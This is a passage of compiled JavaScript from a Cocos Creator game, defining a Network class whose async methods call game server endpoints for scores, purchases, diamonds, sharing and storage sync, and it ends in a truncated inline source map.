//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var AppConfig_1 = require("../config/AppConfig");
var HttpProtocol_1 = require("../../../framework/http/HttpProtocol");
var HttpClient_1 = require("../../../framework/http/HttpClient");
var LocalStorage_1 = require("../../../framework/persistence/LocalStorage");
var Facade_1 = require("../../../framework/facade/Facade");
var NetworkConfig_1 = require("../config/NetworkConfig");
var Network = /** @class */ (function () {
    function Network() {
    }
    Network.post = function (protocol, httpOption) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                // SELF
                return [2 /*return*/];
            });
        });
    };
    Network.login = function () {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve) { return __awaiter(_this, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            resolve();
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    Network.uploadInfo = function () {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        return __generator(this, function (_a) {
                            resolve();
                            return [2 /*return*/];
                        });
                    }); })];
            });
        });
    };
    Network.initData = function () {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        if (!NetworkConfig_1.NetworkConfig.connectServer) return [3 /*break*/, 2];
                        return [4 /*yield*/, Network.initGameData()];
                    case 1:
                        _a.sent();
                        return [3 /*break*/, 3];
                    case 2:
                        World_1.World.Storage.init();
                        _a.label = 3;
                    case 3: return [2 /*return*/];
                }
            });
        });
    };
    Network.uploadLv = function (lv) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/addRecord";
                                    protocol.request = { gameId: AppConfig_1.AppConfig.GameID, key: AppConfig_1.AppConfig.rankKey, score: lv };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    this.pushStorage();
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.buyItem = function (itemId, num) {
        if (num === void 0) { num = 1; }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/mall/buy";
                                    protocol.request = { id: itemId, num: num };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.syncBought = function () {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, list;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/user/items";
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    list = _a.sent();
                                    resolve(list);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.totalRankList = function () {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, list, e_1;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/getTotalRank";
                                    protocol.request = { gameId: AppConfig_1.AppConfig.GameID, key: AppConfig_1.AppConfig.rankKey };
                                    _a.label = 1;
                                case 1:
                                    _a.trys.push([1, 3, , 4]);
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 2:
                                    list = (_a.sent()).list;
                                    resolve(list);
                                    return [3 /*break*/, 4];
                                case 3:
                                    e_1 = _a.sent();
                                    reject(e_1);
                                    return [3 /*break*/, 4];
                                case 4: return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.addDiamond = function (add) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, diamond;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/user/addDiamond";
                                    protocol.request = { num: add };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    diamond = (_a.sent()).diamond;
                                    resolve(diamond);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.expendDiamond = function (expend) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, diamond;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/user/expendDiamond";
                                    protocol.request = { num: expend };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    diamond = (_a.sent()).diamond;
                                    resolve(diamond);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.onShare = function (shareKey, playerId) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    if (!(World_1.World.My.playerId != 0)) return [3 /*break*/, 2];
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/onShare";
                                    protocol.request = { shareKey: shareKey, fromPlayerId: playerId };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    _a.label = 2;
                                case 2:
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.getShareList = function (shareKey) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, list;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/getShareList";
                                    protocol.request = { shareKey: shareKey };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    list = _a.sent();
                                    resolve(list);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.takeShareReward = function (shareKey, playerId) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/receiveSharedRecord";
                                    protocol.request = { shareKey: shareKey, receivePlayerId: playerId };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.setStorage = function (key, value) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/setStorage";
                                    protocol.request = { key: key, value: value };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    resolve(true);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.multiSetStorage = function (pairs) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/multiSetStorage";
                                    protocol.request = { pairs: JSON.stringify(pairs) };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    _a.sent();
                                    resolve(true);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.getStorage = function (key) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, data;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/getStorage";
                                    protocol.request = { key: key };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    data = _a.sent();
                                    resolve(data);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.multiGetStorage = function (keys) {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var protocol, data;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    protocol = new HttpProtocol_1.default();
                                    protocol.uri = "/game/multiGetStorage";
                                    protocol.request = { keys: JSON.stringify(keys) };
                                    return [4 /*yield*/, Network.post(protocol)];
                                case 1:
                                    data = _a.sent();
                                    resolve(data);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    Network.initGameData = function () {
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var keys, values, key, data;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    keys = World_1.World.Storage.allKeys().filter(function (value) { return !World_1.World.updateStorageKeys.includes(value); });
                                    return [4 /*yield*/, Network.multiGetStorage(keys)];
                                case 1:
                                    values = _a.sent();
                                    for (key in values) {
                                        data = values[key];
                                        /** 字符串类型则不转成int */
                                        if (typeof World_1.World.Storage["_" + key] == "number") {
                                            data = parseInt(data);
                                        }
                                        else if (typeof World_1.World.Storage["_" + key] == "boolean") {
                                            data = data.toLowerCase() == "true";
                                        }
                                        World_1.World.Storage[key] = data;
                                    }
                                    resolve();
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    /** 推送缓存里的数据到远程服务器 */
    Network.pushStorage = function () {
        return __awaiter(this, void 0, void 0, function () {
            var _this = this;
            return __generator(this, function (_a) {
                // SELF
                return [2 /*return*/];
            });
        });
    };
    return Network;
}());
exports.default = Network;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL25ldHdvcmsvTmV0d29yay50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7QUFBQSxvQkFBb0I7QUFDcEIsaUZBQWlGO0FBQ2pGLHlGQUF5RjtBQUN6RixtQkFBbUI7QUFDbkIsMkZBQTJGO0FBQzNGLG1HQUFtRztBQUNuRyw4QkFBOEI7QUFDOUIsMkZBQTJGO0FBQzNGLG1HQUFtRzs7QUFHbkcsdUNBQW9DO0FBQ3BDLGlEQUE4QztBQUM5QyxxRUFBZ0U7QUFDaEUsaUVBQThEO0FBRTlELDRFQUF5RTtBQUN6RSwyREFBc0Q7QUFDdEQseURBQXNEO0FBRXREO0lBQUE7SUEwT0EsQ0FBQztJQXhPZ0IsWUFBSSxHQUFqQixVQUFrQixRQUFxQixFQUFFLFVBQXNCO3VDQUFFLE9BQU87OztnQkFDcEUsT0FBTztnQkFDUCxzQkFBTTs7O0tBNEJUO0lBRVksYUFBSyxHQUFsQjt1Q0FBcUIsT0FBTzs7O2dCQUN4QixzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFNLE9BQU87OzRCQUM1QixPQUFPLEVBQUUsQ0FBQzs7O3lCQUNiLENBQUMsRUFBQzs7O0tBQ047SUFFWSxrQkFBVSxHQUF2Qjt1Q0FBMEIsT0FBTzs7O2dCQUM3QixzQkFBTyxJQUFJLE9BQU8sQ0FBQyxVQUFPLE9BQU8sRUFBRSxNQUFNOzs0QkFDckMsT0FBTyxFQUFFLENBQUM7Ozt5QkFDYixDQUFDLEVBQUM7OztLQUNOO0lBRVksZ0JBQVEsR0FBckI7Ozs7OzZCQUNRLDZCQUFhLENBQUMsYUFBYSxFQUEzQix3QkFBMkI7d0JBQzNCLHFCQUFNLE9BQU8sQ0FBQyxZQUFZLEVBQUUsRUFBQTs7d0JBQTVCLFNBQTRCLENBQUM7Ozt3QkFFN0IsYUFBSyxDQUFDLE9BQU8sQ0FBQyxJQUFJLEVBQUUsQ0FBQzs7Ozs7O0tBRTVCO0lBRVksZ0JBQVEsR0FBckIsVUFBc0IsRUFBUzt1Q0FBRSxPQUFPOzs7Z0JBQ3BDLHNCQUFPLElBQUksT0FBTyxDQUFDLFVB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QVEsQ0FBQyxJQUFJLENBQUMsQ0FBQzt5Q0FDekI7NkNBQUssSUFBSSxPQUFPLGFBQUssQ0FBQyxPQUFPLENBQUMsR0FBRyxHQUFDLEdBQUcsQ0FBQyxJQUFJLFNBQVMsRUFBQzs0Q0FDakQsSUFBSSxHQUFHLElBQUksQ0FBQyxXQUFXLEVBQUUsSUFBSSxNQUFNLENBQUM7eUNBQ3ZDO3dDQUNELGFBQUssQ0FBQyxPQUFPLENBQUMsR0FBRyxDQUFDLEdBQUcsSUFBSSxDQUFDO3FDQUM3QjtvQ0FDRCxPQUFPLEVBQUUsQ0FBQzs7Ozt5QkFDYixDQUFDLEVBQUM7OztLQUNOO0lBRUQscUJBQXFCO0lBQ0QsbUJBQVcsR0FBL0I7Ozs7Z0JBQ0ksT0FBTztnQkFDUCxzQkFBTTs7O0tBa0JUO0lBQ0wsY0FBQztBQUFELENBMU9BLEFBME9DLElBQUEiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyIvLyBMZWFybiBUeXBlU2NyaXB0OlxyXG4vLyAgLSBbQ2hpbmVzZV0gaHR0cDovL2RvY3MuY29jb3MuY29tL2